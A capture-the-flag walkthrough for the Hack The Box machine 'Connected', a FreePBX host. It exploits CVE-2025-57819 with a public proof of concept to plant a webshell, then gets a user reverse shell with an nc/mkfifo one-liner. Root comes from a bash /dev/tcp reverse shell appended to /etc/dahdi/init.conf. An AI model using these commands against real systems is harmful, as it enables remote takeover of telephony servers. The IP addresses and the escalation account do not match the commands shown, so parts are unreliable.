---
title: Hack the box - Connected
date: 2026-08-16 12:00:00 +00:00
tags: [htb, linux, hack]
description: Hack the box - connected walkthrough
---

# Connected

## Exploring

Since this is an easy machine, start with a quick port scan:

```shell
$ nmap -F 10.129.245.100
PORT   STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Opening a web app on port 80 in a browser throws a domain resolution error. 
Map the target host in `/etc/hosts`:

```shell
$ cat /etc/hosts
...
10.129.104.87 connected.htb
```

## User flag

A quick search for the identified FreePBX version immediately revealed 
a public PoC for **CVE-2025-57819** [^1]. The exploit can be used to trigger 
the vulnerable functionality and ultimately create a webshell on the target.

```shell
$ wget https://raw.githubusercontent.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819/refs/heads/main/watchTowr-vs-FreePBX-CVE-2025-57819.py

$ python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb
			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
	 \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
	  \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
	   \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
				  \/          \/     \/                            

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-a5k894xlkv.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table

$ curl http://connected.htb/this-is-an-ioc-not-actually-watchTowr-a5k894xlkv.php?cmd=id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

$ curl --get \
    --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.17.215 9001 >/tmp/f" \
    http://connected.htb/this-is-an-ioc-not-actually-watchTowr-a5k894xlkv.php
```

The request gives us command execution as the asterisk user. We can then use 
the webshell to establish a reverse shell back to our attacking machine.

```shell
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.245.100 42454
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
[asterisk@connected html]$ ls ~
user.txt
```

The user flag is located in the asterisk user's home directory.

## Root flag

With a foothold established, privilege escalation enumeration focused on 
system-specific services after standard SUID and capability checks revealed 
no obvious vectors.

An incron configuration was found monitoring writable files, including 
`/usr/local/asterisk/incron` and `ha_trigger`, and triggering privileged 
administrative scripts on modification. Further analysis showed that the 
freepbx_ha module executed rootTrigger() in this workflow.

Since the FreePBX modules directory was writable by the asterisk user, 
the execution path could be influenced with attacker-controlled PHP code.

```shell
[asterisk@connected html]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.17.215/9002 0>&1" &' >> /etc/dahdi/init.conf
[asterisk@connected html]$ echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

A reverse shell is received with root privileges:

```shell
$ nc -lvnp 9002
Listening on 0.0.0.0 9002
Connection received on 10.129.245.100 51182

[root@connected /]# ls /root
root.txt
```

The root flag is stored in /root/root.txt.

---

## References

[^1]: [FreePBX CVE-2025-57819](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)
